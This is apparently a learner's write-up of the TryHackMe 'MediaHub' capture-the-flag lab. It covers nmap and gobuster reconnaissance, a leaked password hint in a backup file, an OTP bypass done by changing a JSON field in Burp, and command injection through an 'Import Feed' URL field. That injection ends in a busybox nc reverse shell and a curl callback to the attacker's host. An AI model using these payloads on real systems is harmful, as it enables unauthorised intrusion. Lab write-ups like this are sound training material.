
CTF challenge from Junior Penetration Tester path on TryHackMe.

Description: ***MediaHub** appears to be a normal internal portal used by journalists to manage content. Everything seems protected behind a login and verification system, but the real story lies in how the application communicates with its backend APIs.*

*Your task is to assume the role of an attacker and closely observe traffic between the browser and the server. Using your proxy skills, intercept the requests, analyse how the application processes them, and experiment with modifying the data being sent.*

*If you understand the flow well enough, a small change in the request might be all it takes to bypass the intended controls. Fire up your proxy, intercept the traffic, and see if you can manipulate the requests to take control of the system.*

There are two flags to grab, one after logging in as a admin, and the second stored in `/var/www/user.txt`.

First I added `interceptor.thm` to the `/etc/hosts` file with `sudo nano /etc/hosts`.

Then as always I ran `nmap` scan despite the fact that this challenge is about intercepting web requests, I wanted to know if there is some kind of surprise.
`nmap -A -p- -T4 -v interceptor.thm`

Results of nmap scan:
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 29:06:7c:10:51:c4:2b:0b:16:34:29:00:97:e7:e4:ff (RSA)
|   256 cf:94:f3:a8:ce:4c:b3:35:b3:af:08:0c:8c:cd:0e:b7 (ECDSA)
|_  256 b0:40:c6:31:f4:5f:c9:b2:70:9b:d1:f7:f4:8d:be:c0 (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: MediaHub
|_http-favicon: Unknown favicon MD5: 0064983D530700270962E34818F1732E
```

Nothing out of ordinary, so I added the target in Burp's scope, set up a proxy, and visited a webapp. There is only a login functionality, I tried some basic ones like `admin:admin`, but it didn't worked.

In the mean time I ran `gobuster` to brute force directories and files. The command I used: `gobuster dir -u 'http://10.82.169.155/' -w /usr/share/wordlists/dirb/big.txt -x .php,.php.bak,.bak,.txt,.jsp,.json,.asp,.js,.py -b 403-500 --exclude-length 1491
`
The results:
```
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 315] [--> http://10.82.169.155/assets/]
/config.php           (Status: 200) [Size: 0]
/dashboard.php        (Status: 302) [Size: 0] [--> login.php]
/footer.php           (Status: 200) [Size: 85]
/header.php           (Status: 200) [Size: 1231]
/javascript           (Status: 301) [Size: 319] [--> http://10.82.169.155/javascript/]
/login.php.bak        (Status: 200) [Size: 2038]
/login.php            (Status: 200) [Size: 2874]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/otp.php              (Status: 302) [Size: 0] [--> login.php]
/phpmyadmin           (Status: 301) [Size: 319] [--> http://10.82.169.155/phpmyadmin/]
/search.php           (Status: 302) [Size: 0] [--> login.php]
/uploads              (Status: 301) [Size: 316] [--> http://10.82.169.155/uploads/]
Progress: 204690 / 204700 (100.00%)
===============================================================
Finished
===============================================================
```

The one result was quite interesting - `/login.php.bak`, so I went straight to downloading it.
Inside a backup file a found a comment left by a dev:
```
/*
|--------------------------------------------------------------------------
| Developer Note (temporary)
|--------------------------------------------------------------------------
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Password policy reminder:
| Admin password follows company format:
| MediaHub + any year
|
| TODO: remove before production deployment
*/
```
Now, I have an email address and for the password I used `MediaHub2026` since in the comment is written: *any year*. 
I successfully logged in, but there is 6-digits OTP to guess. First I tried `123456` to Intercept request in Burp to see how it looks.
The response contains JSON:
```
{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```
I made another request, and intercepted it in Burp, this time I changed name value to `is_verified` and instead of sending 6-digits OTP number, I simply sent `true`.
I successfully bypassed OTP, and went straight into dashboard where the first flag was:
**THM{ADMIN_ACCESS_USING_BURP} **

Now, I need to find a way to access the second flag in `var/www/user.txt`. At the bottom of the page I spotted a *Import Feed* functionality. 
While playing with it, I spotted that after trying to fetch `google.com`, the output looked like one of `curl` command.
Also there is a filter for localhost and private IP addresses.
I tried using command substitution, which allows my command to be executed first, so the payload looked like this: `http://127.1$(curl http://10.82.86.240)`. I also set up simple python web server to check if I got a connection `python3 -m http.server 80`.
I got a hit, so next step is to got a rev shell from the server.
I set up listener `nc -lvnp 1337`, and sent a payload in *Import Feed* feature: `http://127.1$(busybox nc 10.82.86.240 1337 -e bash)`, and I got a connection.
I went straight to `/var/www/user.txt` to grab the second flag:
**THM{SYSTEM_PWNED_SUCCESSFULLY}**
